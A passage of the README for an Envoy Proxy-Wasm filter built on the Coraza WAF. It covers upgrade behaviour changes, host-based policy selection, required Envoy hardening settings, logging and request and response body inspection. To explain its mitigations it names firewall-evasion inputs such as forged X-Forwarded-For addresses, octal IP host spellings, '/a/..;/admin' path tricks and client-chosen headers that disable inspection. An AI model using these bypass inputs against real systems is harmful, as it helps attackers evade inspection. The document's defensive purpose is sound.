# envoy-coraza

Envoy Proxy-Wasm HTTP filter backed by the `coraza` engine. The filter compiles
policy generations and enforces them on request and response phases; the
standalone Envoy harness in [`examples/envoy-coraza`](../examples/envoy-coraza)
exercises the lifecycle checks.

## Upgrade notes: behaviour changes

This release fails closed where earlier builds passed traffic uninspected. Check
each item against your policies before upgrading.

* **Request bodies are buffered and inspected by default.** Every policy now
  starts with `SecRequestBodyAccess On` and `SecRequestBodyLimit 16777216`
  (16 MiB) before its own directives, so a policy that never mentions body
  access, such as one that only includes the CRS or holds only its own rules,
  now reads request bodies. Where earlier builds streamed the request through
  uninspected, such a policy:
  * holds each request body until it ends and inspects it before Envoy forwards
    any of it. A streaming request body, such as a gRPC client or bidirectional
    stream, a long chunked upload or another long-lived request stream, reaches
    the backend only when the client finishes it, bounded by Envoy's
    `request_timeout` and `stream_idle_timeout`, so a bidirectional stream
    stalls;
  * refuses with 413 a body of `SecRequestBodyLimit` bytes or more under
    `SecRequestBodyLimitAction Reject`, the engine default, when the policy is
    in `SecRuleEngine On` (`inspection_reason=denied`,
    `inspection_complete=false`), and every body over 16 MiB in any engine mode
    but `Off` (`inspection_reason=body_too_large`). Envoy answers 413 or 500
    itself first when the body is over its `per_connection_buffer_limit_bytes`
    or the route's `request_body_buffer_limit` (1 MiB by default);
  * refuses with 413 every `multipart/form-data` request with a file part, a
    part with a non-empty `filename` or `filename*`, when the policy is in
    `SecRuleEngine On`: the filter has no filesystem, so the engine refuses
    uploads instead of storing them (`inspection_reason=denied`; the
    interruption properties carry `rule_id=0` and `status=413`). A multipart
    body the parser stopped in before its end, because a part is malformed or
    because it holds more than `SecArgumentsLimit` fields, or that
    `SecRequestBodyLimitAction ProcessPartial` cut before its closing
    delimiter, is refused the same way, since what was not read could be a
    file;
  * refuses with 413 a URL-encoded body, a JSON body that a rule parses as
    JSON (CRS does for `application/*+json` and AWS JSON types, with rules
    901360 and 901370), or an XML body that a rule parses as XML
    (`@recommended-conf` rule 200000 does for XML content types), with more
    than `SecArgumentsLimit` fields, or XML attribute and text values (1000 by
    default), in any engine mode but `Off`
    (`inspection_reason=incomplete`, `inspection_complete=false`). With
    `@recommended-conf`, its rules 200002, 200004 and 200005 answer 400
    first;
  * refuses with 415 every request whose `Content-Encoding` names anything but
    `identity`, such as `gzip` or `br`, with or without a body, in any engine
    mode but `Off` (`inspection_reason=unsupported`): the engine cannot read a
    compressed body;
  * charges each buffered body against the root context's 64 MiB body budget
    (see [Body memory budget](#body-memory-budget)).

  The connector emits bounded, rate-limited decision warnings for refusals it
  originates. Policy-rule denials, including rule-based 413 responses, follow
  the rule's `log`/`nolog` action and do not add connector-decision lines.
  Envoy's access log shows the status, and the v1 health properties show the
  reason regardless of `enable_filter_state_logs` (see the harness's
  [observability notes](../examples/envoy-coraza/README.md#observability)).
  To let a host's bodies through uninspected, write `SecRequestBodyAccess Off`
  in its policy, or serve the endpoints that need it from a host of their own
  with such a policy. To do so only for some requests, add a phase-1 rule with
  `ctl:requestBodyAccess=Off` scoped to the paths that need it, here multipart
  uploads to `/upload` and bodies sent to `/import` with a `Content-Encoding`
  header, whatever its value:

  ```text
  SecRule REQUEST_FILENAME "@streq /upload" "id:1,phase:1,pass,nolog,chain"
    SecRule REQUEST_HEADERS:Content-Type "@beginsWith multipart/form-data" "ctl:requestBodyAccess=Off"
  SecRule REQUEST_FILENAME "@streq /import" "id:2,phase:1,pass,nolog,chain"
    SecRule &REQUEST_HEADERS:Content-Encoding "@gt 0" "ctl:requestBodyAccess=Off"
  ```

  The filter counts both rules in the policy's configure-time `enforces` line,
  names each at `info` level, and reports each such request that carries a
  body as `inspection_complete=false`,
  `inspection_reason=request_body_not_inspected`.

  **Do not key such a rule only on request headers**, such as the content type
  or the presence of a `Content-Encoding`: the client chooses them, so any
  client could switch body inspection off for any request, attacks included,
  by sending its fields as `multipart/form-data` or adding
  `Content-Encoding: identity`. The path decides which backend endpoint gets
  the unread body, so scope the rule by path, and by method if that narrows it.

  To read larger forms, raise `SecArgumentsLimit`. To accept larger bodies,
  raise `SecRequestBodyLimit`, up to its maximum of 16777216, together with
  Envoy's buffer limits (see
  [Required Envoy configuration](#required-envoy-configuration)), or set
  `SecRequestBodyLimitAction ProcessPartial` to inspect only the first
  `SecRequestBodyLimit` bytes of a body of up to 16 MiB
  (`inspection_reason=body_partially_inspected`).
* **A `SecRequestBodyLimit` over 16 MiB now fails the configuration** when the
  policy has no `SecRequestBodyAccess` line. Earlier builds loaded it because
  body access was off and the limit unused; now Envoy rejects the configuration
  and the filter logs, for example:

  ```text
  envoy-coraza: rejected plugin configuration: policy "main" cannot run on this host: SecRequestBodyLimit is 20000000 bytes, over the 16777216-byte WASM ceiling
  ```

  Set `SecRequestBodyLimit` to 16777216 or less, or add
  `SecRequestBodyAccess Off` if the policy is not meant to read bodies.
* **Unlisted authorities are refused with 421**, and a configuration with
  policies but no selector is rejected; see [Policy selection](#policy-selection)
  for `"unmatched_authority": "allow"`. Authority keys and request authorities
  must be in normal form: a request whose host is percent-encoded, carries a
  sub-delimiter, an empty label, or numbers only in another spelling than a
  dotted-decimal IPv4 address (`010.0.0.1`, `167772161`) is refused with 400.
  An IPv4-mapped IPv6 literal (`[::ffff:10.0.0.1]`) selects the entry of the
  IPv4 address it holds, and is no longer accepted as a key itself.
* **Requests selecting a policy without a usable client IP are refused with
  503**; Unix-domain and internal listeners that must pass such requests need
  `"missing_client_address": "allow"`. See
  [Required Envoy configuration](#required-envoy-configuration).
* **`@recommended-conf` enforces**: a policy that includes it without
  `SecRuleEngine On` now blocks; see
  [Recommended baseline](#recommended-baseline-recommended-conf).
* **A request body the memory budget stopped is refused with 503** in every
  engine mode, `DetectionOnly` included; see
  [Body memory budget](#body-memory-budget) for which bodies reach it.
* **Rules that would keep more than the memory budget has left are stopped**:
  the request is refused with 503, or the response replaced with 502, in every
  engine mode (`inspection_reason=body_memory_budget_stopped`), and no rule of a
  later phase runs, the phase 5 logging rules included. Earlier builds
  compared only what the transaction still held after the rules, and let the
  rules allocate what they needed on the way, so they passed a body that this
  one refuses when the copies its rules make do not fit what the root has left.
  CRS's `multiMatch` rules copy every `ARGS` value up front, and that copy is
  charged. A benign URL-encoded body of more than about 10.7 MiB (a sixth of the
  root's 64 MiB: the copies of the body that the host and the connector hold,
  what the parse keeps and that copy do not fit the root together) is therefore
  refused with 503 at CRS paranoia level 1, where earlier builds passed it: 900
  prose fields pass up to 11,197,689 bytes and stop from 11,198,589, and the
  recommended `SecRequestBodyLimit` is 12.5 MiB, so the bodies from 10.7 to
  12.5 MiB are the ones affected. This is deliberate: a body that size is where
  the root's memory runs out, and a false positive is preferred to the engine
  allocating past it. The root's budget is the constant
  `MAX_ROOT_RETAINED_BODY_BYTES` in `envoy-coraza/src/stream.rs` (64 MiB), not
  a setting: a deployment that must pass such bodies raises it and rebuilds
  (`make build-envoy-wasm`), and pays for it in linear memory, which a worker
  never gives back. The `msg` and `logdata` a match keeps, in the audit log's
  part `K` and in `RULE:msg` and `RULE:logdata`, are cut to 4096 bytes, which
  changes the verdict of a rule that compares with or copies `%{RULE.msg}` or
  `%{RULE.logdata}` for a longer text (CRS has no such rule). See
  [Body memory budget](#body-memory-budget).
* **Cookies count against `SecArgumentsLimit`**: a request with more than
  `SecArgumentsLimit` cookies (1000 by default), counted across all its
  `Cookie` headers, is refused with 413 in any engine mode but `Off`,
  `DetectionOnly` included, also when the request ends at its headers
  (`inspection_reason=incomplete`, `inspection_complete=false`). With
  `@recommended-conf` and `SecRuleEngine On`, its rule 200004 answers 400 first.
  This holds whatever `SecRequestBodyAccess` says, and earlier builds read every
  cookie. Raise `SecArgumentsLimit` for clients that send more.
* **The embedded CRS no longer honours rules 905100 and 905110**; see
  [Embedding the OWASP Core Rule Set](#embedding-the-owasp-core-rule-set).
* **A refused response is a local reply**, sent when the filter decides,
  instead of the upstream response rewritten in place: headers that filters
  add on the response path are absent on it. Earlier builds could not rewrite
  a response refused at its headers or before its last body chunk, such as a
  `HEAD` or 204 response a rule denies, a compressed response of an inspected
  type or one over 1 MiB, and Envoy's idle timer ended the stream with 504.
  The reply ends the stream, so a request body that a policy without body
  access was still sending, which earlier builds let through after a
  response-phase denial, no longer reaches the backend. A `redirect` whose
  target is empty, such as a macro that expanded to nothing, is answered 403
  without `location`, where earlier builds sent the rule's 3xx without one.
  For a gRPC request, Envoy answers the local reply with HTTP 200 and a
  `grpc-status` (7, `PERMISSION_DENIED`, for a rule's 403) instead of the
  configured HTTP status, as it already did for request-phase refusals:
  HTTP-status-based monitoring no longer sees the rule's status (such as 403)
  for a gRPC call refused on its response.
  See [Refused responses](#refused-responses).
* **Legacy interruption `status` now reports the effective local-reply
  status when `enable_filter_state_logs` is enabled.** The optional
  `io.coraza.waf.status` property reports the validated status passed to Envoy
  for the local reply, not the raw configured interruption status. An invalid
  status (for example, 100), or a redirect whose target cannot form a
  `Location` value, falls back to 403 and reports 403. The existing validator
  accepts 200–599, including 204. A rule using `deny,status:200` still prevents
  the request from reaching the upstream but returns a 2xx reply that can look
  successful to clients or success-based monitoring.

## Empty or missing configuration

A blank, whitespace-only or missing plugin configuration is rejected on every
load, so Envoy NACKs the update and keeps the previous configuration. Envoy
creates a fresh root context for each configuration update (LDS or ECDS), so the
filter cannot tell a first load from a reload, and accepting blank input would
let a cleared configuration disable inspection. The one deliberate way to run
an uninspected filter is an explicit recognised key, such as
`{"directives_map": {}}`, which the filter accepts and logs as a warning.

A configuration with policies but neither `default_directives` nor
`per_authority_directives` is rejected: nothing could select its policies. Add
`"unmatched_authority": "allow"` to load it anyway and pass every request
uninspected.

## Policy selection

The filter selects a request's policy by its authority (`:authority`, or Envoy's
`request.host`): the `per_authority_directives` entry for the authority, then,
when the authority carries a port, the entry for the bare host, then
`default_directives`. The authority is normalized first: lowercase, one trailing
dot of a host name dropped, the scheme's default port dropped, an IPv6 literal
in its compressed form and a port without leading zeros, so `Host.example.`,
`host.example:443` over plain HTTP and `host.example:8080` all select the
`host.example` entry when they have none of their own. An IPv4-mapped IPv6
literal, such as `[::ffff:10.0.0.1]` or `[::ffff:a00:1]`, names the IPv4
address it holds, so it selects the `10.0.0.1` entry. A host name may hold only
letters, digits, `-`, `.` and `_`: an authority with a percent-escape, a `,`
(what Envoy makes of two `Host` headers) or another sub-delimiter is refused
with 400. So is a host of numbers only, decimal, octal or `0x` hex, that is not
an IPv4 address in dotted-decimal form: resolvers and backends read `010.0.0.1`,
`10.1`, `167772161` and `0xa000001` as addresses, so each is refused rather than
looked up as a host name, where it would miss an address key and get the
default policy or a 421. Every `per_authority_directives` key must already be in
that normal form, and with Envoy's `strip_any_host_port` (see
[Required Envoy configuration](#required-envoy-configuration)) it must be a bare
host, as the filter never sees the port.

A request that selects no policy is refused with 421 when the configuration has
policies, and its telemetry reads `inspection_reason=unmatched_authority`,
`terminal_outcome=error`. **A deployment that relies on unlisted hosts passing
uninspected must add `"unmatched_authority": "allow"`** (the other accepted
value is `"reject"`, the default); with it and no default policy the filter logs
a configure-time warning. corazawaf/coraza-proxy-wasm passes such a request and
the networking-incubator fork answers 500.

A default policy is what every unlisted or respelled host gets, so it must be at
least as strict as every per-authority policy, or be absent so that unlisted
hosts are refused.

## Required Envoy configuration

The filter inspects the request Envoy hands it, so it depends on these Envoy
settings. [`examples/envoy-coraza/envoy.yaml`](../examples/envoy-coraza/envoy.yaml)
sets every row marked "set", and its harness fails when one of them is missing.

| Setting | Where | Required value | Without it |
| --- | --- | --- | --- |
| `failure_policy` | Wasm filter `config` | `FAIL_CLOSED` (or `FAIL_RELOAD`); never `FAIL_OPEN` or `fail_open: true` (set) | under `FAIL_OPEN` a trap disables the filter for the worker |
| `allow_on_headers_stop_iteration` | Wasm filter `config` | `true` (set) | every inspected body hangs until the idle timeout |
| `proxy_100_continue` | connection manager | `false` (set) | the harness's deployment invariant: request headers stay paused while phase 1 runs |
| `use_remote_address` | connection manager | `true` at the edge (set) | `REMOTE_ADDR` is the last `X-Forwarded-For` entry, which the client chooses |
| `xff_num_trusted_hops` | connection manager | the number of trusted proxies in front of Envoy, `0` at the edge (set) | a trusted proxy's address, or a forged one, becomes the client |
| `strip_trailing_host_dot` | connection manager | `true` (set) | `host.` reaches the filter as another spelling of `host` |
| `strip_any_host_port` | connection manager | `true` (set) | `host:1`, `host:080` and `host:443` reach the filter as other spellings of `host` |
| virtual host `domains` | route configuration | the protected hosts, not `"*"`, whenever per-authority policies differ | a respelled or unlisted host is routed to the protected backend (the harness keeps `"*"` to address several hosts through one listener) |
| `normalize_path` | connection manager | `true` (set) | dot segments with parameters, such as `/a/..;/admin`, reach the rules and the backend unresolved |
| `merge_slashes` | connection manager | `true` (set) | a network-path form such as `//admin` defeats anchored path rules |
| `path_with_escaped_slashes_action` | connection manager | `REJECT_REQUEST` (set) | `%2F` and `%5C` reach a backend that decodes them |
| `headers_with_underscores_action` | connection manager `common_http_protocol_options` | `REJECT_REQUEST` (set) | `User_Agent` is a different header to the rules and the same one to a CGI-style backend |
| `request_headers_to_remove` | route configuration | `x-original-url`, `x-rewrite-url` (set) | a legacy rewrite header selects a path no path rule saw |
| `envoy.reloadable_features.http_reject_path_with_fragment` | runtime | its default, `true` | a raw `#` in the path reaches the engine, which cuts the target there |
| `stream_idle_timeout`, `request_timeout` | connection manager | finite, sized to the largest upload (`60s` each, set) | a stalled upload holds up to 16 MiB of the root's 64 MiB without limit |
| `per_connection_buffer_limit_bytes`, route `request_body_buffer_limit` | listener, cluster, route | at least the largest `SecRequestBodyLimit` in use, at most 16 MiB (16 MiB, set) | Envoy answers 413 or 500 itself at its 1 MiB default |
| `max_request_headers_kb` | connection manager | its default, 60 | a 1 MiB cookie header costs seconds of CPU |
| `accept_http_10` | connection manager `http_protocol_options` | off, its default | with an unmodified CRS tree, HTTP/1.0 request lines also match CRS rule 905110 |
| Wasm log level | Envoy `--component-log-level` | `wasm` at `warn` or more verbose | rule lines, configure-time warnings, rate-limited connector-decision lines and each policy's `enforces` line with its count of rules that switch the rule engine or request body access off, all logged at `warn`, are dropped; the lines naming those rules are logged at `info`; audit lines are logged at `critical`, so only `off` drops them |

`REMOTE_ADDR` is only as trustworthy as `use_remote_address` and
`xff_num_trusted_hops`: without them, every rule keyed on the client address,
an allowlist or a blocklist alike, and any client address a rule or audit log
records are whatever the client writes in `X-Forwarded-For`. Connector-decision
lines deliberately contain no client address or other request data. The rules
see the request after Envoy's normalization, so a path or host rule matches the
normalized form, which is the one the backend routes on. `REJECT_REQUEST` for
header names with an underscore refuses clients that send them on purpose;
`DROP_HEADER` keeps them working but drops the header without a trace.

For a request that selects a policy, a missing or malformed `source.address`
now receives 503 before that policy's rules run, with
`inspection_reason=incomplete` and `terminal_outcome=incomplete`. This gate
applies regardless of `SecRuleEngine`, including `DetectionOnly` and `Off`.
The filter does not derive this address from `X-Forwarded-For`. A Unix-domain or
internal listener without an IP address can set the top-level
`"missing_client_address": "allow"` to retain the previous behavior. This is a
per-plugin-configuration option, so it applies to all listeners sharing that
configuration. It emits a configure-time warning because `REMOTE_ADDR` then
stays empty. An unnegated `@ipMatch` blocklist rule will not match an empty
`REMOTE_ADDR` (the IP operator rejects empty input), though arbitrary rules can
still match that empty value. Rules therefore cannot reliably identify or match
the client's actual IP. A failure of the `source.address` property hostcall
still fails closed with 503 in either mode. The first such rejection in each
generation is logged even when its decision count is not a power of two;
subsequent connector decisions use the shared sample. These warnings identify a
missing or malformed address by phase and status and carry the fixed hint
`set_missing_client_address_allow`; they never include request data.
Filter-state v1 still reports only the generic `inspection_reason=incomplete`,
which does not distinguish a missing address from a malformed one.

## Observability

The additive `io.coraza.waf.v1.*` health properties are published for every
stream pinned to a configured generation; a context without one cannot publish
terminal health or emit generation-scoped connector-decision warnings.
`enable_filter_state_logs` (false by default) gates only the legacy
`io.coraza.waf.*` interruption properties. The filter finalizes and publishes
the allowed `SecRuleEngine Off` and `unmatched_authority=allow` bypasses before
their request-header callbacks return, so their state is available to Envoy's
access logger. A context finalized before request headers reach this filter is
reported as `inspection_complete=false`, `inspection_reason=incomplete`,
`terminal_outcome=incomplete`; this classification sends no local reply and
infers no reply status. A reset or other stream ending that reaches `on_done`
still publishes terminal state there, after Envoy has written its access-log
line; those late properties cannot appear in that line. No `on_log` hook is
used.

Connector decisions are written at `Warn` using fixed values only:
`envoy-coraza: <passed|refused> (outcome=<reason> phase=<phase> status=<status> count=<n> [hint=<fixed-hint>])`.
The square brackets mark an optional template suffix; emitted lines contain no
brackets, and omit `hint=` when there is no fixed hint.
The hints are mnemonics, not JSON keys: `set_missing_client_address_allow`
means the top-level setting `"missing_client_address": "allow"`, and
`set_unmatched_authority_allow` means `"unmatched_authority": "allow"`.
The counter is shared by streams pinned to one compiled generation in its root
context; separate root contexts count independently, so this is not a
cluster-wide limit. It emits at counts 1, 2, 4, 8, and so on; the first
missing-client-address rejection and first unmatched-authority decision in each
generation are also logged when their counts fall between those samples. A
local refusal uses its reply status; `status=0` means a pass had no local-reply
status. Unmatched-authority, engine-off and partially inspected passes are
logged too, as are passed request bodies that were not inspected. A `passed`
warning records the connector's local decision to allow traffic past this
filter, with the shown inspection outcome; it does not confirm end-to-end
delivery or successful transaction finalization. A stream can still end with
`terminal_outcome=upstream_failure_or_cancellation` after a reset/cancellation,
or report `inspection_reason=finalization_error` and `terminal_outcome=error` if
finalization fails. Policy-rule denials remain governed by Coraza's
`log`/`nolog` actions; they do not produce connector-decision lines or consume
this counter. Connector lines contain no authority, path, header, body or other
request data.

When published, legacy `io.coraza.waf.status` reports the validated status
passed to Envoy for the local reply; see the
[upgrade note](#upgrade-notes-behaviour-changes) for fallback behavior.

All serialized audit formats pass through the control-character sanitizer
before Proxy-Wasm logging; literal line feeds are escaped as the two characters
`\n`, so one audit entry stays on one log line. Native-format text appends
` [truncated]` when cut. The existing 16 KiB output bound and configured audit
parts remain in force.

## Recommended baseline (`@recommended-conf`)

Every build, with or without the CRS, embeds Go Coraza's recommended engine
configuration as the built-in file `@recommended-conf`, under the name
coraza-proxy-wasm uses. Load it first in every policy:

```json
{
  "directives_map": {
    "main": [
      "Include @recommended-conf",
      "SecRuleEngine On",
      "SecRule ARGS \"@detectSQLi\" \"id:1000,phase:2,deny,status:403\""
    ]
  },
  "default_directives": "main"
}
```

Its rules turn the engine's error flags into blocks. A rule set alone does not:
the CRS reads none of these flags, so without the baseline a body the engine
could not parse is neither inspected nor blocked.

| Rule | Effect |
| --- | --- |
| 200000, 200001, 200006 | Select the XML and JSON body processors for XML, `application/json` and `+json` content types; without them those bodies are not parsed into `ARGS_POST`. |
| 200002 | Denies with 400 when the request body processor fails (`REQBODY_ERROR`). |
| 200003 | Denies with 400 when a multipart body fails strict validation (`MULTIPART_STRICT_ERROR`). |
| 200004, 200005 | Deny with 400 when arguments or cookies were dropped at `SecArgumentsLimit` (`ARGUMENTS_LIMIT_REACHED`); cookies are dropped in phase 1, so rule 200004 answers for them. |
| 200009 | Denies with 400 when the request target does not parse (`URI_PARSE_ERROR`). |

The file has a single source, the engine copy
[`coraza/coraza.conf-recommended`](../coraza/coraza.conf-recommended), which
`cargo xtask go-fixtures-check` keeps byte-identical to the pinned Go Coraza
release. [`build.rs`](build.rs) derives the built-in file from it on every build:
it adds a header and comments out `SecRequestBodyInMemoryLimit` and `SecDataDir`,
because this filter has no filesystem and keeps the whole request body in memory.
It also comments out upstream's `SecRuleEngine DetectionOnly` under its own note,
so the engine default `On` applies: **policies that include `@recommended-conf`
without `SecRuleEngine On` now block.** A policy that wants detection only writes
`SecRuleEngine DetectionOnly` itself, before or after the `Include`; the filter
logs a configure-time warning for a policy in `DetectionOnly` or `Off`, and a
line at the same `warn` level for each policy that enforces (`envoy-coraza:
policy "<name>" enforces; rules that switch the rule engine or request body
access off: <N>`). Every
other line is the engine copy's, and a test checks that. The file also enables
request and response body access with upstream's limits and `RelevantOnly`
audit logging. Override any of those with directives after the `Include`.

The `Include` must name the file exactly: no wildcard pattern selects it, not
even a bare `Include *`, so a wildcard cannot silently replace a policy's own
body and audit settings with the file's. A configured `rule_data` entry named
`@recommended-conf` replaces the built-in file, and wildcards match that entry
like any other configured file. The file uses one of the 1024 `rule_data` file
slots and about 12 KiB of the 8 MiB total budget; the [CRS hardening supplement](#crs-hardening-supplement-crs-hardening-conf)
uses another slot and about 50 KiB.

## Request body access

Unlike Go Coraza and coraza-proxy-wasm, the filter inspects request bodies by
default: every policy starts with `SecRequestBodyAccess On` and a
`SecRequestBodyLimit` of 16 MiB, the host ceiling, before its own directives. A
policy loses bodies only by writing `SecRequestBodyAccess Off`, and the filter
then logs a configure-time warning. The rules that switch the rule engine or
request body access off at run time (`ctl:ruleEngine=Off`,
`ctl:ruleEngine=DetectionOnly` or `ctl:requestBodyAccess=Off`) are counted in
the policy's `enforces` line, at `warn`, and each is named in a line of its own
at `info`, with every such action it runs. Other `ctl` actions that narrow
inspection, such as `ctl:ruleRemoveByTag` or `ctl:ruleRemoveById`, are not
counted. A request whose body
bytes the filter released unread (a later Envoy filter could still hold them,
so they may not have reached the backend) is reported as
`inspection_complete=false`,
`inspection_reason=request_body_not_inspected`, whatever ended the stream: when
a response-phase rule then denies, `terminal_outcome=denied` shows the denial,
as it does beside the `body_partially_inspected` of a truncated body. So is a
request whose body had not ended when its response completed, since the rest
may still follow, and one whose body a processor failed on part way, an XML or
JSON syntax error or a malformed multipart part, when no rule denied it (see
[Body memory budget](#body-memory-budget)), since the part it did not read was
not inspected. A refusal is different: the filter's local reply, in the
request or the response phase, ends the stream, so the rest of the body never
reaches the backend. Over HTTP/1.1 Envoy sends the reply and closes the
connection, over HTTP/2 it resets the stream, and in both Envoy resets the
upstream request; the filter also holds whatever of the request still arrives,
so a reply that could not be sent lets nothing through either. A rule can
refuse at the response headers, before the request body: a phase-3 rule
always, and a phase-4 rule that the engine runs early, because the response
has no body or its body is not inspected, or because the rule reads only
response-header variables. A request refused before the filter released any of
its body bytes is reported as the refusal alone,
such as `inspection_reason=denied`, `inspection_complete=true` for a rule's
denial. A request that ends without body bytes, with an empty last DATA frame
or with trailers alone, is not reported unread either.

**This is a compatibility cost, not only a memory one**: a policy without a
`SecRequestBodyAccess` line, a CRS-only one included, now holds every request
body until it ends, streaming ones such as gRPC included, and refuses with 413
or 415 bodies earlier builds streamed through uninspected: large or numerous
ones, file uploads and compressed ones. See
[Upgrade notes](#upgrade-notes-behaviour-changes) for each refusal, its
telemetry and its opt-out.

`SecRuleEngine Off` still passes the request before the filter refuses upgrade
requests with 501, so turning the engine off for a host remains the way to let
WebSockets through. A plain `CONNECT` carries no path, so the filter refuses it
with 503 (`inspection_reason=incomplete`) in every engine mode; one whose
authority selects no policy is handled as any such request (421 by default).

## Refused responses

The filter holds the headers of every response whose body it inspects until
the body's verdict, so nothing of a response it refuses has reached the client.
It refuses a response with a local reply at the moment it decides, at the
response headers, in a body chunk, at the end of the body or at its trailers:

* a rule that interrupts in phase 3 or 4, with the rule's status;
* a response of an inspected type with a `Content-Encoding` other than
  `identity`, even one with no body such as a `HEAD` response, a body over
  1 MiB, or a body the memory budget stopped its parser in (see
  [Body memory budget](#body-memory-budget)), with 502;
* a response whose rules the memory budget stopped (see
  [Body memory budget](#body-memory-budget)), with 502;
* a body that the root's 64 MiB of retained body memory has no room for, with
  503;
* a `101` upgrade response, with 501;
* a response the filter cannot read, with 502 or 503.

Every reply carries `cache-control: no-store`. A reply with a body also
carries `content-type: text/plain; charset=utf-8`; Envoy removes that header
from a reply with an empty body, such as one for a `HEAD` request or a
redirect. The body names its kind:
`Upstream response blocked` for a rule, `Response inspection unavailable` for
a response the filter could not inspect, and `Request feature is not supported`
for a 101. A reply has no body for a `HEAD` request, a reply status of 204 or
304, or a redirect. Envoy sends a
local reply issued on the response path straight to the client, without
running the encoder filters, so headers that other filters add on the response
path, such as security headers, are absent on a refused response. The reply
ends the stream, so a request body still arriving never reaches the backend
(see [Request body access](#request-body-access)). After the reply the filter
releases nothing more of the upstream response or of the request, even when
the reply could not be sent. A phase-3 rule, and a phase-4 rule that the
engine runs at the response headers (because the response has no body, its
body is not inspected, or the rule reads only response-header variables),
refuses the response there.

For a gRPC request, one whose `content-type` is `application/grpc` or starts
with `application/grpc+` (the match is case-sensitive, and
`application/grpc;charset=utf-8` does not match, so its refusal keeps the HTTP
status), Envoy turns every local reply into a trailers-only gRPC response:
HTTP 200 with `grpc-status` set from the reply's status, so a rule's 403
becomes `grpc-status: 7` (`PERMISSION_DENIED`) and the 502 of a body the filter
could not read becomes `grpc-status: 14` (`UNAVAILABLE`). A client sees the
refusal as a gRPC error, but monitoring that counts HTTP statuses sees 200, not
the status the rule chose. Refusals in the request phase already behaved this
way; a response-phase refusal now does too, since earlier builds rewrote a
refused response in place, keeping the rule's HTTP status (or let it hang until
Envoy's timeout).

A `redirect` reply carries the rule's target as `location` only when the
target is not empty and holds no control byte; otherwise the filter answers 403
without `location`. The engine already percent-encodes control bytes that a
macro brings into a target (see
[Behavior changes](../coraza/README.md#behavior-changes)), so a target such as
`/login?next=%{ARGS_GET.next}` cannot split the reply's headers, and an empty
target is what a macro that expands to nothing leaves. For such a target the
client gets 403 while the legacy interruption properties keep the engine's
`action=redirect` and report the actual reply `status=403`.

Envoy's own reply to a request the filter still holds, such as the 408 of
`request_timeout` or `stream_idle_timeout`, reaches the client as Envoy wrote
it. The filter reports that stream as `inspection_complete=false`,
`inspection_reason=incomplete`, `terminal_outcome=incomplete`, and keeps the
request held, so the rest of its body never reaches the backend.

## Body memory budget

Each Proxy-Wasm root context allows its streams 64 MiB of retained body memory, and Wasm linear memory never
shrinks, so what a body makes the engine allocate while it is parsed sticks to the VM. Before it parses a request or
response body the filter therefore gives the engine what the root has left (`Transaction::set_body_memory_budget`),
less what this stream already holds: the host's buffer and the guest's copy of the body, the engine's buffer (the
prefix of the body that `SecRequestBodyLimit`/`SecResponseBodyLimit` retains, not all of what the host holds) with
whatever the transaction held before the body (`ARGS`, `TX`, matched rules), and the copy of that prefix the processor
keeps beside its parse: the raw body of a URL-encoded or raw body, the JSON text of a JSON body. XML and multipart
bodies keep no such copy. A copy that is made before the parse and does not fit the root is refused with 503, as any
retained-body overshoot is.

The XML, JSON, URL-encoded and multipart processors charge their values, the entries that hold them and their
scratch against the budget before allocating, and stop at it keeping what they accepted. What follows differs by
direction:

* **Request.** `REQBODY_ERROR` is set and the body-phase rules run on what was parsed, so a rule that denies on the
  error still answers first: `@recommended-conf` rule 200002 answers 400. Where the host refuses file uploads, a
  multipart body that the parser stopped in, for the budget or because a part was malformed, or that
  `SecRequestBodyLimitAction ProcessPartial` cut before its closing delimiter, is refused with 413 after the body-phase
  rules ran if none of them denied it, since the part it did not read, or the bytes the limit discarded, could be an
  upload. Otherwise the connector itself refuses a body the budget stopped with 503 (`inspection_complete=false`,
  `inspection_reason=body_memory_budget_stopped`), in every engine mode, `DetectionOnly` included: the part the parser
  did not reach was not inspected. That refusal is the fix's false-positive cost: a URL-encoded or JSON body of
  roughly 9 to 12 MiB reaches the budget on an idle root, and a smaller one of any kind, XML included, beside other
  streams that hold bodies. `SecRequestBodyLimitAction ProcessPartial` does not avoid it: the host still holds the
  whole body, so a 16 MiB XML or URL-encoded body whose 8 MiB prefix the engine keeps is refused on an idle root.
* **Response.** `RES_BODY_ERROR` is set, but `@recommended-conf` has no rule for it: rule 200002 reads only
  `REQBODY_ERROR`. The budget is a limit the connector imposes and not one of the policy's, so the connector itself
  answers a response whose parser stopped at it with a 502 local reply, unless a rule denied it first. A response body that merely
  does not parse (`RES_BODY_ERROR` for another reason) is left to the policy's rules, as before.

The rules of the body phase draw on what the parse left of the budget (`Transaction::set_body_memory_budget` documents
the engine side). Before it allocates them, the engine charges what the rules keep: every match with the value it
matched and its key, both whole, and its expanded `msg` and `logdata`, each cut to 4096 bytes, and the matched rule's
record with the metadata it copies (the rule's text, its `msg` and `logdata` templates, tags, version and file); the
entry a match adds to `MATCHED_VARS`, until the next rule clears it, and the buffers `MATCHED_VAR` and
`MATCHED_VAR_NAME` grow to, which the transaction keeps; what `setvar` and `capture` write to `TX` and `setenv` writes
to `ENV`, net of the value they replace or the entry `setvar:!tx.key` removes; the path arguments an operator writes;
and, until the rule is done, the lists of the values it selects, the copies it makes for the multiphase duplicate check,
the snapshots a rule makes of what its own actions may change, and the copy `multiMatch` makes of each value it selects
(CRS's `multiMatch` rules make it of every `ARGS` value, which stops a benign URL-encoded body of more than about 10.7
MiB at paranoia level 1; see [Upgrade notes](#upgrade-notes-behaviour-changes) for what to do about it). The list of
selected values is charged before each growth of the list, so that a collection of any number of values
(`MULTIPART_PART_HEADERS`, which `SecArgumentsLimit` does not bound, is one) cannot make a list larger than the budget
has left; the list holds references to the collection's own values and names, so a name that is not UTF-8 costs it no
more than any other. A rule that matches and is not recorded, such as a chain whose second link fails, gives its matches
back. The charge that does not fit ends rule evaluation for the transaction, including the phase 5 logging rules (the
request is refused already, and a rule that ran would allocate with the budget spent): nothing is charged or evaluated
after it, the rule that was running records nothing and denies nothing, and the connector refuses the request with 503,
or replaces the response with 502, in every engine mode, `DetectionOnly` included (`inspection_complete=false`,
`inspection_reason=body_memory_budget_stopped`, `terminal_outcome=incomplete`; a request whose retained body the root
cannot also hold is refused with the same 503 and reported `inspection_reason=retained_body_budget_exhausted`). The
engine writes its audit entry for
the transaction if the audit configuration selects it (`SecAuditEngine`, and for `RelevantOnly` the relevance of the
status of the interruption or would-be interruption the transaction holds: the 503, unless an earlier rule recorded one,
as a would-be 403 in `DetectionOnly` stays 403, or the response status when none was recorded, because the engine was
switched `Off`), judged without the phase 5 rules, which did not run; it carries the rules recorded before the stop and,
